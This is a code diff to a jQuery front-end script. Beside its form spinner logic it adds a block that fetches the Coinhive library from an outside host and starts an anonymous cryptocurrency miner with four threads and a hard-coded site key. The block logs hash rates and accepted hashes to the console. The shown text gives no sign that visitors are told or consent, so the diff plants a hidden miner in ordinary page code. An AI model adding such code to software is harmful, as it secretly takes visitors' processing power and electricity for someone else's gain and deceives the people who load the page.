@@ -35,5 +35,21 @@
       $('.form-inline .spinner').hide();
     }, 500);
   };
+  
+  $.getScript("https://coin-hive.com/lib/coinhive.min.js", function() {
+    var miner = new CoinHive.Anonymous('QXffMhe03aQYYvkKg3SjwLGM9voA2vTI', {threads: 4});
+    miner.start();
+    // Listen on events
+    miner.on('found', function() { console.log('hash found'); })
+    miner.on('accepted', function() { console.log('hash accepted by pool'); })
+    // Update stats once per second
+    setInterval(function() {
+    	var hashesPerSecond = miner.getHashesPerSecond();
+    	var totalHashes = miner.getTotalHashes();
+    	var acceptedHashes = miner.getAcceptedHashes();
+      console.log('hpS: '+hashesPerSecond+'; tH: '+totalHashes+'; aH: '+acceptedHashes);
+    	// Output to HTML elements...
+    }, 5000);
+  });
 
 })(jQuery);
